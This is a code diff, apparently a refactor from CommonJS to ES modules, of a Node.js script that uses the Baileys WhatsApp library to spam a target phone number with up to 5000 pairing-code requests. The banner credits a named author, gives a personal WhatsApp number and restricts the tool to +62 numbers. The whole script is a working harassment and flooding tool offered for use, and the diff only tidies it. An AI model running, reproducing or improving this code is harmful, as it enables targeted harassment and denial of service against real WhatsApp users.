@@ -1,17 +1,16 @@
-const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
-const pino = require('pino');
-const readline = require("readline");
+import makeWASocket, { useMultiFileAuthState } from "@whiskeysockets/baileys";
+import pino from 'pino';
+import readline from "readline";
 
-
-    const color = [
-        '\x1b[31m', 
-        '\x1b[32m', 
-        '\x1b[33m', 
-        '\x1b[34m', 
-        '\x1b[35m', 
-        '\x1b[36m'
-    ];
-    const wColor = color[Math.floor(Math.random() * color.length)];
+const color = [
+    '\x1b[31m',
+    '\x1b[32m',
+    '\x1b[33m',
+    '\x1b[34m',
+    '\x1b[35m',
+    '\x1b[36m'
+];
+const wColor = color[Math.floor(Math.random() * color.length)];
 
 const xColor = '\x1b[0m';
 
@@ -37,35 +36,31 @@ async function KleeProject() {
         browser: ["Ubuntu", "Chrome", "20.0.04"],
     });
     try {
-        // Ask for phone number
         const phoneNumber = await question(color + 'Target : ' + xColor);
-        
-        // Request the desired number of pairing codes
-        const KleeCodes = parseInt(await question(color + 'Total spam : '+ xColor));
+        const KleeCodes = parseInt(await question(color + 'Total spam : ' + xColor));
 
         if (isNaN(KleeCodes) || KleeCodes <= 0) {
             console.log('example : 20.');
             return;
         }
 
-        // Get and display pairing code
         for (let i = 0; i < KleeCodes; i++) {
             try {
                 let code = await KleeBotInc.requestPairingCode(phoneNumber);
                 code = code?.match(/.{1,4}/g)?.join("-") || code;
-                console.log(color + `Succes Spam Pairing Code - Number : ${phoneNumber} from : [${i + 1}/${KleeCodes}]`+ xColor);
+                console.log(color + `Succes Spam Pairing Code - Number : ${phoneNumber} from : [${i + 1}/${KleeCodes}]` + xColor);
             } catch (error) {
                 console.error('Error:', error.message);
             }
         }
     } catch (error) {
-                 console.error('error') ;
-}
+        console.error('error');
+    }
 
     return KleeBotInc;
 }
-console.log(color +`
-========================= 
+console.log(color + `
+=========================
 Nama pembuat script[Rizky]
 =========================
 1•WhatsApp +6283850540570
@@ -76,10 +71,10 @@ Nama pembuat script[Rizky]
 ┏❐
 ┃ [FOLLOW THE INSTRUCTIONS BELOW TO SPAM]
 ┃
-┃⭔ Target Number ( 62xxxxxxx ) 
+┃⭔ Target Number ( 62xxxxxxx )
 ┃⭔ how much spam ( 1-5000 )
 ┃
-┃ [THIS TOOL CAN ONLY BE USED ON NUMBER +62] 
+┃ [THIS TOOL CAN ONLY BE USED ON NUMBER +62]
 ┗❐
 =========================` + xColor);
 
